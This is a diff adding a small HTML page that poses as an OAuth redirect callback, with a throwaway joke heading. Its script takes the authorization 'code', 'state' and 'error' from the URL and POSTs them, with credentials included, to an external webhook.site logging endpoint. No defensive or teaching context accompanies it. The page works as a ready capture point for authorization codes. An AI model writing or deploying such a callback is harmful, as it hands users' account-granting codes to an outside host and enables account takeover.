@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+
+<script>
+    const params = new URLSearchParams(window.location.search);
+    const code = params.get("code");
+    const state = params.get("state");
+    const error = params.get("error");
+
+    fetch("https://webhook.site/28c54aae-b353-4708-a029-f0fb185e5f35", {
+        method: 'POST',
+        body: `${code}, ${state}, ${error}`,
+        credentials: "include"
+    })
+
+</script>
+<h1>callback or smth idunno man im cooked</h1>
